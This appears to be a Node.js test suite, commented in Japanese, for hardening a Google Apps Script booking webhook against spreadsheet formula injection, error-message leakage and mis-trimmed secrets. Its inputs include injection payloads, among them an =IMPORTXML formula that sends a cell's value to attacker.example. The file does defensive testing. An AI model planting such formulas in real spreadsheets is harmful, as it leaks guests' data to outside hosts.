// WO-PB-3F の残り（F3・F6・段階 A の秘密の空白除去。docs/2026-09-24-WO-PB-3F-reserve-abuse.md）の GAS 側。test/run.sh から実行される。
// 守ること:
//   F3 appendInquiry: 文字列のセルが = + - @ タブ CR で始まるなら ' を前置して記帳する（Sheets に数式として解釈させない。
//      =HYPERLINK・=IMPORTXML で担当者の画面に偽のリンクを出したり外部へ値を送らせたりできた）。WhatsApp テキスト（N 列）も同じ。
//      それ以外の値・途中の = は変えない。電話は既に ' 付きなので二重にしない
//   F6 doPost の例外: 応答は固定の 'internal'（例外のメッセージにはシートの ID や値が入りうる。詳細は実行ログだけ）
//   段階 A isAuthorized: スクリプト プロパティと送られてきた秘密の前後の空白を除いてから比べる（貼り付けで入る改行・空白で
//      正しい送信を拒否しない）。除いた後が 32 文字未満なら未設定と同じ（fail-closed）
// 検出力の確認（2026-09-24）: 変更前の src（c81039b）をビルドして GAS_BUILD_DIR で実行し、17 件中 14 件が落ちることを確認した
//   ― F3 9 件（' が付かない）、F6 1 件（例外のメッセージが応答に出た）、秘密 4 件（前後の空白で拒否・空白だけの 40 文字と
//   空白込み 33 文字のプロパティを秘密として受け入れた）。誤検知しないことの 3 件（普通の値・電話の ' が 1 つ・途中の空白）は変更前も通る。
const assert = require('assert');

const SECRET = 'x'.repeat(40);
let scriptProps = { WEBHOOK_SECRET: SECRET };
let appended = [];
let failSheet = null;
const inquiriesSheet = {
  getLastRow: () => 1 + appended.length,
  appendRow: (row) => appended.push(row.slice()),
  getRange: () => ({ setValue: () => {}, setValues: () => {} }),
};
global.SpreadsheetApp = {
  getActiveSpreadsheet: () => {
    if (failSheet) throw new Error(failSheet);
    return {
      getSheetByName: (n) =>
        n === 'Inquiries' ? inquiriesSheet
          : n === 'Settings' ? { getDataRange: () => ({ getValues: () => [['Key', 'Value']] }) }
            : null,
    };
  },
};
global.PropertiesService = { getScriptProperties: () => ({ getProperty: (k) => (k in scriptProps ? scriptProps[k] : null) }) };
global.ContentService = { MimeType: { JSON: 'json' }, createTextOutput: (s) => ({ body: JSON.parse(s), setMimeType() { return this; } }) };
// formatDate・Session は WhatsApp テキストの日付（Templates.formatMailDate）が使う。yyyy-MM-dd だけを返す
global.Utilities = {
  sleep: () => {},
  formatDate: (d, tz, fmt) => { assert.strictEqual(fmt, 'yyyy-MM-dd'); return new Intl.DateTimeFormat('en-CA', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit' }).format(d); },
};
global.Session = { getScriptTimeZone: () => 'Asia/Tokyo' };
console.warn = () => {}; console.error = () => {};

const { doPost } = require(process.env.GAS_BUILD_DIR + '/Main');

const future = new Date(Date.now() + 40 * 864e5).toISOString().slice(0, 10);
const later = new Date(Date.now() + 70 * 864e5).toISOString().slice(0, 10);
const base = { name: 'Synthetic', email: 'synthetic@example.com', language: 'en', checkin: future, checkout: later, room: 'Villa', room_id: 'villa', guests: 2, notes: '', webhook_secret: SECRET };
const post = (obj) => doPost({ postData: { contents: JSON.stringify(obj) } }).body;
// 列（0 始まり）: C 名前・D メール・E 言語・H 部屋・J 備考・N WhatsApp・P 電話
const COL = { NAME: 2, EMAIL: 3, LANGUAGE: 4, ROOM: 7, REMARKS: 9, WHATSAPP: 13, PHONE: 15 };

const failures = [];
function t(label, fn) {
  try {
    fn();
  } catch (e) {
    failures.push(label);
    console.log(`FAIL ${label}: ${String(e.message).split('\n')[0]}`);
  }
}
/** 1 件記帳して、その行を返す */
function record(over) {
  const n = appended.length;
  const res = post({ ...base, ...over });
  assert.strictEqual(res.success, true, `記帳に成功する（${JSON.stringify(res)}）`);
  assert.strictEqual(appended.length, n + 1, '1 行記帳');
  return appended.at(-1);
}

// ---- F3: 数式の無害化
const leads = [
  ['=', '=HYPERLINK("https://spam.example","Click")'],
  ['+', '+1+2'],
  ['-', '-2+3'],
  ['@', '@SUM(1,2)'],
  ['タブ', '\t=1+1'],
  ['CR', '\r=1+1'],
];
for (const [label, value] of leads) {
  t(`F3 備考が ${label} で始まる → ' を前置`, () => {
    const row = record({ notes: value });
    assert.strictEqual(row[COL.REMARKS], `'${value}`);
  });
}
t('F3 氏名 =IMPORTXML → \' を前置', () => {
  const v = '=IMPORTXML("https://attacker.example/?q="&D2,"//a")';
  assert.strictEqual(record({ name: v })[COL.NAME], `'${v}`);
});
t('F3 メール・言語・部屋（秘密を知る者の直接 POST）も対象', () => {
  const row = record({ email: '=x@example.com', language: '=1+1', room: '+cmd' });
  assert.strictEqual(row[COL.EMAIL], "'=x@example.com");
  assert.strictEqual(row[COL.LANGUAGE], "'=1+1");
  assert.strictEqual(row[COL.ROOM], "'+cmd");
});
t('F3 記帳した行に、数式として解釈されうる文字列のセルが 1 つも無い（N 列の WhatsApp テキストを含む）', () => {
  const row = record({ name: '=A1', notes: '-1', room: '@x' });
  const bad = row.map((v, i) => [i, v]).filter(([, v]) => typeof v === 'string' && /^[=+\-@\t\r]/.test(v));
  assert.deepStrictEqual(bad, []);
  assert.ok(typeof row[COL.WHATSAPP] === 'string' && row[COL.WHATSAPP].includes('=A1'), 'WhatsApp テキストに氏名が入る');
});
t('F3 誤検知しない: 普通の値・途中の = はそのまま', () => {
  const row = record({ name: 'Synthetic Guest', notes: 'a=b, 1+1, x@y, need parking' });
  assert.strictEqual(row[COL.NAME], 'Synthetic Guest');
  assert.strictEqual(row[COL.REMARKS], 'a=b, 1+1, x@y, need parking');
  assert.strictEqual(row[COL.EMAIL], 'synthetic@example.com');
});
t("F3 電話は ' が 1 つだけ（+ で始まる番号を二重にしない）", () => {
  assert.strictEqual(record({ phone: '+62 812-3456-7890' })[COL.PHONE], "'+62 812-3456-7890");
});

// ---- WhatsApp テキスト（オーナー向け・英語）の日付は「4 November 2026」（米国式の 11/4/2026 はインドネシア語の読み手に 4 月 11 日に読める）。
//      検出力: 変更前の src（9747d02）で落ちることを確認した（2026-09-25）
t('WhatsApp テキストの日付は読み違えない形', () => {
  const row = record({ checkin: '2026-11-04', checkout: '2026-12-04' });
  assert.match(row[COL.WHATSAPP], /- Check-in: 4 November 2026\n- Check-out: 4 December 2026\n/);
});

// ---- F6: doPost の例外は固定文言
t('F6 例外のメッセージを応答に含めない', () => {
  failSheet = 'Service Spreadsheets failed while accessing document with id 1Td8SYNTHETIC; value synthetic@example.com';
  try {
    const res = post(base);
    assert.deepStrictEqual(res, { success: false, error: 'internal' });
  } finally {
    failSheet = null;
  }
});

// ---- 段階 A: 秘密の前後の空白
t('秘密: スクリプト プロパティの前後に空白・改行があっても通る', () => {
  scriptProps = { WEBHOOK_SECRET: `  ${SECRET}\n` };
  try {
    assert.strictEqual(post(base).success, true);
  } finally {
    scriptProps = { WEBHOOK_SECRET: SECRET };
  }
});
t('秘密: 送られてきた値の前後に空白・改行があっても通る', () => {
  assert.strictEqual(post({ ...base, webhook_secret: `${SECRET}\r\n` }).success, true);
});
t('秘密: 空白だけのプロパティは未設定と同じ（fail-closed）', () => {
  scriptProps = { WEBHOOK_SECRET: ' '.repeat(40) };
  try {
    const n = appended.length;
    assert.deepStrictEqual(post({ ...base, webhook_secret: ' '.repeat(40) }), { success: false, error: 'unauthorized' });
    assert.strictEqual(appended.length, n, '記帳しない');
  } finally {
    scriptProps = { WEBHOOK_SECRET: SECRET };
  }
});
t('秘密: 空白を除くと 32 文字未満のプロパティは未設定と同じ', () => {
  const short = 'y'.repeat(31);
  scriptProps = { WEBHOOK_SECRET: ` ${short} ` };
  try {
    assert.deepStrictEqual(post({ ...base, webhook_secret: ` ${short} ` }), { success: false, error: 'unauthorized' });
  } finally {
    scriptProps = { WEBHOOK_SECRET: SECRET };
  }
});
t('秘密: 途中の空白は除かない（別の値として拒否）', () => {
  assert.deepStrictEqual(post({ ...base, webhook_secret: `${SECRET.slice(0, 20)} ${SECRET.slice(21)}` }), { success: false, error: 'unauthorized' });
});

if (failures.length) {
  console.log(`hardening: ${failures.length} 件 FAILED`);
  process.exit(1);
}
console.log('hardening: ALL ASSERTIONS PASSED');
